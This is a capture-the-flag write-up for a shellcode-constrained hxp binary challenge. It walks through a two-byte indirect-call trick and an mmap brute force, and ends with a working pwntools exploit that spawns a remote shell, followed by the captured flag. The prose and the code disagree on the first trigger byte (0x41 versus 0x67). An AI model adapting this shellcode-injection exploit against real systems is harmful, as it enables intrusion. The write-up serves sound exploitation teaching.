Solved & written up by monocleus

## Challenge description

The challenge's binary is very similar to no-eeeeeeeeeemoji from Dragon Sector
CTF 2020 ( https://ctftime.org/task/14011 ).

For those who didn't play that CTF, the binary presents with a menu of three
choices:

(b)eer - Generates a random address, allocates a RWX page via mmap() and saves
it to a global variable  
(h)orse - Uses the allocated RWX map in the following way:

* Take 0x1000 bytes from user  
* Overwrite parts of it with character 'A', with the final layout being the following:  
   * 0x0 - 0x100: User-controlled  
   * 0x100 - 0x200: 'A' filler  
   * 0x200 - 0x202: User-controlled  
   - 0x202 - 0x23E: Program Shellcode #2 ( provided by the binary ).   
   - 0x23E - 0x300: 'A' filler  
   - 0x300 - 0x400: User controlled  
   - 0x400 - 0x413: Program Shellcode #1 ( also provided by the binary )  
   - 0x413 - 0x1000: User controlled

Then, execution gets passed to Program Shellcode #1 which overwrites 0x10000
bytes on stack and overwrites all registers other than RSP and RIP with
0xDEADBEEFDEADBEEF. Then, execution gets passed to code at 0x200 - providing
you with two-bytes worth of code execution, followed by the shellcode
consisting of mostly NOPs, followed by two syscalls:  
* write(1, buf, 0x26)  
* exit() 

## Binary patches

The binary is, however, patched at several places:

1) The VDSO cannot be leaked anymore as puts() gets nopped out  
2) The function that generates random rwx page has been simplified ( no
transformation of rand() result other than shifting it 12 bits left ) and
removing the < 0x10000 check. This effectively makes the function return mmaps
equal to rand() << 12  
3) The first syscall ( write ) out of Program Shellcode #2 gets patched out.

This makes the attack described in previous writeup impractical.

## Solution

Again, the major problem here is the very constrained environment - only two
bytes space for code execution, all registers are nuked, and stack is full of
0x4141414141414141 ( 'AAAAAAAA') entries.

Our solution here was to take advantage of the following NOP bytes, by using
0x41 0xFF.  
This in turn will concatenate with NOPs into a 0x41 0xFF 0x90 0x90 0x90 0x90
0x90 - **call qword ptr ds:[eax-0x6F6F6F70]**

Recall that RAX = 0xDEADBEEFDEADBEEF, which means eax = 0xDEADBEEF. 0xDEADBEEF
- 0x6F6F6F70 = 0x6F3E4F7F, which means that assuming we can control 0x6F3E4F7F
( which we can - 0xF7F is not an offset overwritten by the 'A' ), we can call
into an arbitrary location and gain comfortable code execution.

So, the plan was as follows:  
* Bruteforce the mmap until we gain a mmap at 0x6F3E4000  
* Write at 0x6F3E4F7F - 0x6F3E4000  
* Write our shellcode at 0x6F3E4000

Doing so will net you code execution and ability to get the flag:

```python  
from pwn import *

def choose_from_menu(choice):  
   io.sendlineafter('beer\n\n', choice)

def beer():  
   choose_from_menu('b')  
   io.recvuntil('@')  
   address = io.recvline()[:-1]  
   if address == "(nil)":  
       return_address = 0  
   else:  
       return_address = int(address,16)  
   return return_address

io = remote('116.203.18.177',65432)  
l = log.progress('brutforcing mmap: ')  
while True:  
   mmap = beer()  
   l.status(hex(mmap))  
   if mmap == 0x6F3E4000:  
       break  
l.success('success!')  
info('mmap: {}'.format(hex(mmap)))

#Shellcode  
payload = asm(shellcraft.amd64.sh(),arch='amd64')  
#Pad to 0x200  
payload += '\xaa' * (512 - len(payload))  
#call qword ptr ds:[eax-0x...]  
payload += '\x67\xFF'  
#Pad to 0xF7F  
payload += '\xaa' * (3967 - len(payload))  
#Read address for qword trampoline  
payload += '\x00\x40\x3E\x6F\x00\x00\x00\x00'  
#Pad to 0x1000  
payload += '\xaa' * (4096 - len(payload))  
l = log.progress("Sending payload..")  
choose_from_menu('h')  
io.sendlineafter('gib:\n', payload)  
l.success("Sent payload.")  
io.interactive()  
```

```  
hxp{5uch_4_ch34p_c45h_3rrr_fl4g_gr4b}  
```

Original writeup (https://rentry.co/722yq).